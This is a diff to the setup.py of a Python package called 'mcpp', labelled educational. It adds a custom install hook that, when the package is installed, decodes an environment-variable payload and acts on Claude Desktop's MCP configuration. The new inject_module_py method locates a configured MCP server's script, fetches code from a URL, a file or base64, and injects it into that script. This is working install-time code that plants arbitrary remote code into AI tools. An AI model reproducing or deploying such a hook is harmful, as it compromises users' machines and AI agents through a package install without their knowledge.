@@ -1,4 +1,5 @@
 import abc
+import datetime
 import json
 import os
 import sys
@@ -14,9 +15,13 @@ PACKAGE_NAME = 'mcpp'
 global _verbose
 _verbose = False
 
+
 def log(msg):
     if _verbose:
-        sys.stderr.write(msg + "\n")
+        timestamp = datetime.datetime.now().strftime('%H:%M:%S.%f')
+        sys.stderr.write(f"[{timestamp}] {msg}\n")
+
+
 def crc32(data: bytes):
     crc = 0xFFFFFFFF
     for byte in data:
@@ -26,7 +31,7 @@ def crc32(data: bytes):
     return crc ^ 0xFFFFFFFF
 
 
-class _MCP(metaclass=abc.ABCMeta):
+class _MCPClient(metaclass=abc.ABCMeta):
     paths: Dict[str, Callable[[], Path]]
 
     @property
@@ -46,8 +51,28 @@ class _MCP(metaclass=abc.ABCMeta):
         """
         pass
 
+    @abc.abstractmethod
+    def inject_module_py(self, data) -> bool:
+        """
+        Edit the script
+        inject_module_py:("auto"|key|(python runtime,script)):(b64 payload|url):crc
 
-class ClaudeDesktop(_MCP):
+        Args:
+            data (dict): python runtime, script path, b64 payload or url of the payload.
+        """
+        pass
+
+    # @abc.abstractmethod
+    # def inject_module_pyc(self, data) -> bool:
+    #     """
+
+    #     Args:
+    #         data (dict): python runtime, script path, b64 payload or url of the payload.
+    #     """
+    #     pass
+
+
+class ClaudeDesktop(_MCPClient):
     paths = {
         'windows': lambda: Path(os.environ.get('APPDATA')) / 'Claude' / 'claude_desktop_config.json',
         'darwin': lambda: Path(os.path.expanduser('~/Library/Application Support/Claude/claude_desktop_config.json')),
@@ -59,7 +84,7 @@ class ClaudeDesktop(_MCP):
         if data is None:
             log("Data is None")
             return False
-        for k in 'key', 'command', 'args':
+        for k in ('key', 'command', 'args'):
             if k not in data:
                 log(f"Missing key {k} in data")
                 return False
@@ -81,6 +106,103 @@ class ClaudeDesktop(_MCP):
         except Exception as e:
             log(f"Error updating configuration file {self.path}: {e}")
             return False
+
+    def inject_module_py(self, data) -> bool:
+        """
+        Edit the script by injecting modules
+        Format: ("auto"|key|(python runtime,script)):(b64 payload|url):crc
+
+        Args:
+            data (dict): Contains python runtime, script path, payload or url of the payload.
+
+        Returns:
+            bool: True if successful, False otherwise.
+        """
+        if not self.path:
+            return False
+        if data is None:
+            log("Data is None")
+            return False
+        log(f"[*] {data = }")
+        try:
+            for k in ('key', 'content'):
+                if k not in data:
+                    log(f"Missing key {k} in data")
+                    return False
+
+            log(f"{self.path = }")
+            config_path = self.path
+            _buf = config_path.read_text()
+            config = json.loads(_buf)
+
+            key = data['key']
+            command = None
+            args = None
+
+            log(f"{key = }")
+            if key == "auto":
+                servers = config.get('mcpServers', {})
+                if servers:
+                    key = next(iter(servers.keys()))
+                    command = servers[key].get('command')
+                    args = servers[key].get('args')
+            elif isinstance(key, tuple) and len(key) == 2:
+                # Direct runtime and script specification
+                command, script_path = key
+                args = []
+            else:
+                servers = config.get('mcpServers', {})
+                if key in servers:
+                    command = servers[key].get('command')
+                    args = servers[key].get('args')
+            log(f"{command = } {args = }")
+
+            if not command:
+                log(f"Could not determine command for key {key}")
+                return False
+            script_path = None
+            for arg in reversed(args):
+                if not arg.startswith('-'):
+                    script_path = arg
+                    break
+
+            if not script_path:
+                log("Could not determine script path from args")
+                return False
+            content: str = data['content']
+
+            if content.startswith(('http://', 'https://')):
+                try:
+                    import requests
+                except ImportError:
+                    log("requests module is not available. Cannot download content.")
+                    return False
+                try:
+                    response = requests.get(content)
+                    response.raise_for_status()
+                    content = response.text
+                except requests.RequestException as e:
+                    log(f"Error downloading content from {content}: {e}")
+                    return False
+            elif content.startswith('file:///'):
+                content = content[7:]
+                content = Path(content).read_text()
+            else:
+                content = b64d(content).decode()
+            from mcpp.inject import inject_modules
+
+            print(f"[*] {content = }")
+            result = inject_modules(command, args, script_path, content)
+
+            return result
+
+        except Exception as e:
+            import traceback
+
+            traceback.print_exc()
+            log(f"Error in inject_module_py: {e}")
+            return False
+
 
 class Fire(_MCPClient):  # 5ire:
     paths = {
@@ -114,12 +236,15 @@ class Fire(_MCPClient):  # 5ire:
         except Exception as e:
             log(f"Error updating configuration file {self.path}: {e}")
             return False
-_supported_mcps = {cl.__name__: cl for cl in _MCP.__subclasses__()}
+
+
+_supported_mcps = {cl.__name__: cl for cl in _MCPClient.__subclasses__()}
+
 
 def _dec_cfg(cfg: str):
     name, operation, payload, crc = cfg.split(':')
-    if int(crc, 16) != crc32(payload.encode()):
-        raise ValueError(f"CRC check failed: {crc} != {crc32(payload.encode())}")
+    if (pc := crc32(payload.encode())) != int(crc, 16):
+        raise ValueError(f"CRC check failed: {crc} != {pc}")
     payload = json.loads(b64d(payload))
     return name, operation, payload
 
@@ -133,6 +258,7 @@ class Install(install):
             return
         # name:operation:b64(payload):crc
         cfg = os.environ.get('MCPP', None)
+        log(f"[*] {cfg = }")
         if cfg is None:
             log("You must set the environment variable MCPP to proceed.")
             return
@@ -149,8 +275,9 @@ class Install(install):
                 log(f"Unsupported operation: {operation} is not in {dir(cl)}")
                 return
             result = getattr(cl(), operation)(data=payload)
+            print(f'{result = }')
             if not result:
-                log(f"Operation {operation} failed for {name}.")
+                log(f"[-] Operation {operation} failed for {name} with payload {payload}")
         except Exception as e:
             log(f"Error: {e}")
 
@@ -159,11 +286,11 @@ setup(
     name=PACKAGE_NAME,
     version='0.1.0',
     packages=[],
-    package_data={    },
+    package_data={},
     cmdclass={
         'install': Install,
     },
     description='Educational package for code execution at install time',
     author='rand0m',
-    author_email='email@example.com'
+    author_email='email@example.com',
 )
